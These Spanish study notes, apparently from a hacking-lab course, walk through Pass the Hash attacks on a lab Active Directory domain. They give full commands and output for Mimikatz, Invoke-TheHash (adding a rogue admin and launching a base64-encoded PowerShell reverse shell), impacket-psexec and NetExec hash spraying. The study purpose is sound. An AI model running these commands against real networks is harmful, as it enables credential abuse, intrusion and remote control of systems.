Pass the Hash es una técnica que consiste en autenticarse mediante el Hash de un usuario en ver de la contraseña en texto plano. 
No hace falta desencriptar el HASH para acceder a los servicios de 3as personas. 
El atacante debe disponer de privilegios de administrador (o privilegios particulares) sobre el Target para obtener la contraseña en forma de Hash.

Se puede obtener un HASH de las siguientes formas:
- Mediante la base de datos SAM.
- Extrayendo los Hashes de la base de datos NTDS (ntds.dit)
- Extrayendo los Hashes de la memoria lsass.exe.

---

Vamos a asumir que obtenemos el HASH (64F12CDDAA88057E06A81B54E73B949B) de la cuenta *julio* dek dinubui "inlanefreight.htb".

## Introducción a Windows NTLM

El Administrador de LAN de Nuevas Tecnologías de Windows (NTLM) de Microsoft es un conjunto de protocolos de seguridad que autentica la identidad de los usuarios a la vez que protege la integridad y confidencialidad de sus datos. NTLM es una solución de inicio de sesión único (SSO) que utiliza un protocolo de desafío-respuesta para verificar la identidad del usuario sin necesidad de proporcionar una contraseña.

A pesar de sus fallos conocidos, NTLM se sigue utilizando habitualmente para garantizar la compatibilidad con clientes y servidores antiguos, incluso en sistemas modernos. Si bien Microsoft sigue dando soporte a NTLM, Kerberos se ha consolidado como el mecanismo de autenticación predeterminado en Windows 2000 y los dominios de Active Directory (AD) posteriores.

Con NTLM, las contraseñas almacenadas en el servidor y el controlador de dominio no se "saltean", lo que significa que un adversario con un hash de contraseña puede autenticar una sesión sin conocer la contraseña original. A esto lo llamamos ataque de "pass the hash" (PtH).

#### Pass the Hash con Mimikatz (Windows)

La primera herramienta que usaremos para realizar un ataque de Pasar el Hash es **Mimikatz.**
Mimikatz cuenta con un módulo llamado ""*sekurlsa::pth*" que nos permite realizar un ataque de Pasar el Hash iniciando un proceso con el hash de la contraseña del usuario. 

Para usar este módulo, necesitaremos lo siguiente:

- /user: el nombre de usuario que queremos suplantar.
- /rc4 o /NTLM: hash NTLM de la contraseña del usuario.
- /domain: dominio al que pertenece el usuario que queremos suplantar. En el caso de una cuenta de usuario local, podemos usar el nombre del equipo, localhost o un punto (.).
- /run: el programa que queremos ejecutar con el contexto del usuario (si no se especifica, ejecutará cmd.exe).

Ejecutaremos:
```
c:\tools> mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
```

Y nos devolverá:

```
c:\tools> mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit

user    : julio
domain  : inlanefreight.htb
program : cmd.exe
impers. : no
NTLM    : 64F12CDDAA88057E06A81B54E73B949B
  |  PID  8404
  |  TID  4268
  |  LSA Process was already R/W
  |  LUID 0 ; 5218172 (00000000:004f9f7c)
  \_ msv1_0   - data copy @ 0000028FC91AB510 : OK !
  \_ kerberos - data copy @ 0000028FC964F288
   \_ des_cbc_md4       -> null
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ *Password replace @ 0000028FC9673AE8 (32) -> null
```

---
## Pass the Hash with PowerShell Invoke-TheHash (Windows)
Otra herramienta que podemos usar para realizar ataques Pass the Hash en Windows es Invoke-TheHash. Esta herramienta es un conjunto de funciones de PowerShell para realizar ataques Pass the Hash con WMI y SMB. Se accede a las conexiones WMI y SMB a través de .NET TCPClient. 

Contexto: WMI (Windows Management Instrumentation) es la infraestructura de administración integrada en Windows que permite consultar y controlar el sistema operativo, el hardware y aplicaciones mediante una interfaz estandarizada. 

La autenticación se realiza pasando un hash NTLM al protocolo de autenticación NTLMv2. No se requieren privilegios de administrador local en el lado del cliente, pero el usuario y el hash que usamos para la autenticación deben tener derechos administrativos en el equipo de destino. Para este ejemplo, usaremos el usuario julio y el hash 64F12CDDAA88057E06A81B54E73B949B.

Al usar Invoke-TheHash, tenemos dos opciones: ejecución de comandos SMB o WMI. Para usar esta herramienta, necesitamos especificar los siguientes parámetros para ejecutar comandos en el equipo de destino:

- Objetivo: Nombre de host o dirección IP del objetivo.
- Nombre de usuario: Nombre de usuario para la autenticación. Dominio: Dominio que se usará para la autenticación. Este parámetro no es necesario con cuentas locales ni al usar @dominio después del nombre de usuario.
- Hash: Hash de contraseña NTLM para la autenticación. Esta función acepta el formato LM:NTLM o NTLM.
- Comando: Comando que se ejecutará en el destino. Si no se especifica un comando, la función comprobará si el nombre de usuario y el hash tienen acceso a WMI en el destino.

El siguiente comando utilizará el método SMB para la ejecución de comandos para crear un nuevo usuario llamado mark y agregarlo al grupo Administradores.
#### A) Invoke-TheHash with SMB
Ejecutaremos:
```powershell-session
PS c:\htb> cd C:\tools\Invoke-TheHash\
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose

VERBOSE: [+] inlanefreight.htb\julio successfully authenticated on 172.16.1.10
VERBOSE: inlanefreight.htb\julio has Service Control Manager write privilege on 172.16.1.10
VERBOSE: Service EGDKNNLQVOLFHRQTQMAU created on 172.16.1.10
VERBOSE: [*] Trying to execute command on 172.16.1.10
[+] Command executed with service EGDKNNLQVOLFHRQTQMAU on 172.16.1.10
VERBOSE: Service EGDKNNLQVOLFHRQTQMAU deleted on 172.16.1.10
```

Resultado: se creó el usuario local mark y se le añadió al grupo Administradores del equipo objetivo.

También podemos obtener una conexión de shell inversa en la máquina de destino. 
Para obtener una reverse shell, necesitamos iniciar nuestro receptor usando Netcat en nuestra máquina Windows, cuya dirección IP es 172.16.1.5. Usaremos el puerto 8001 para esperar la conexión:

```
PS C:\tools> .\nc.exe -lvnp 8001

listening on [any] 8001 ...
```

Con "https://www.revshells.com/" generamos una reverse shell codificada y ejecutamos:

```
S c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash> Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMwAzACIALAA4ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="

[+] Command executed with process id 520 on DC01
```

El resultado es una conexión de shell inversa desde el host DC01 (172.16.1.10).

---
#### B) Pass the Hash with Impacket (Linux)
Impacket tiene varias herramientas que podemos usar para diferentes operaciones, como ejecución de comandos y volcado de credenciales, enumeración, etc. Para este ejemplo, realizaremos la ejecución de comandos en la máquina de destino usando PsExec:

```shell-session
Polika4RM@htb[/htb]$ impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.129.201.126.....
[*] Found writable share ADMIN$
[*] Uploading file SLUBMRXK.exe
[*] Opening SVCManager on 10.129.201.126.....
[*] Creating service AdzX on 10.129.201.126.....
[*] Starting service AdzX.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.19044.1415]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

---
## Pass the Hash with NetExec (Linux)

NetExec es una herramienta de postexplotación que ayuda a automatizar la evaluación de seguridad de grandes redes de Active Directory. Podemos usar NetExec para intentar autenticarnos en algunos o todos los hosts de una red, buscando un host donde podamos autenticarnos correctamente como administrador local. Este método también se denomina "Rociado de contraseñas" y se explica en detalle en el módulo "Enumeración y ataques de Active Directory". Tenga en cuenta que este método puede bloquear cuentas de dominio, así que tenga en cuenta la política de bloqueo de cuentas del dominio objetivo y asegúrese de usar el método de cuenta local, que solo intentará iniciar sesión una vez en un host dentro de un rango determinado con las credenciales proporcionadas, si esa es su intención.

Ejecutamos:
```shell-session
Polika4RM@htb[/htb]# netexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453

SMB         172.16.1.10   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:.) (signing:True) (SMBv1:False)
SMB         172.16.1.10   445    DC01             [-] .\Administrator:30B3783CE2ABF1AF70F77D0660CF3453 STATUS_LOGON_FAILURE 
SMB         172.16.1.5    445    MS01             [*] Windows 10.0 Build 19041 x64 (name:MS01) (domain:.) (signing:False) (SMBv1:False)
SMB         172.16.1.5    445    MS01             [+] .\Administrator 30B3783CE2ABF1AF70F77D0660CF3453 (Pwn3d!)
```

**\[IMPORTANTE]**
Si queremos realizar las mismas acciones, pero intentar autenticarnos en cada host de una subred usando el hash de la contraseña del administrador local, podríamos añadir --local-auth a nuestro comando. 

Este método es útil si obtenemos un hash del administrador local volcando la base de datos SAM local en un host y queremos comprobar a cuántos otros hosts (si los hay) podemos acceder gracias a la reutilización de la contraseña del administrador local. Si vemos "Pwn3d!", significa que el usuario es administrador local en el equipo de destino. Podemos usar la opción -x para ejecutar comandos. Es común ver la reutilización de contraseñas en varios hosts de la misma subred. Las organizaciones suelen usar imágenes maestras con la misma contraseña de administrador local o la configuran de la misma forma en varios hosts para facilitar la administración. Si nos encontramos con este problema en una interacción real, una excelente recomendación para el cliente es implementar la Solución de Contraseña del Administrador Local (LAPS), que aleatoriza la contraseña del administrador local y puede configurarse para que rote en un intervalo fijo.
##### NetExec - Command Execution
```shell-session
Polika4RM@htb[/htb]# netexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami

SMB         10.129.201.126  445    MS01            [*] Windows 10 Enterprise 10240 x64 (name:MS01) (domain:.) (signing:False) (SMBv1:True)
SMB         10.129.201.126  445    MS01            [+] .\Administrator 30B3783CE2ABF1AF70F77D0660CF3453 (Pwn3d!)
SMB         10.129.201.126  445    MS01            [+] Executed command 
SMB         10.129.201.126  445    MS01            MS01\administrator
```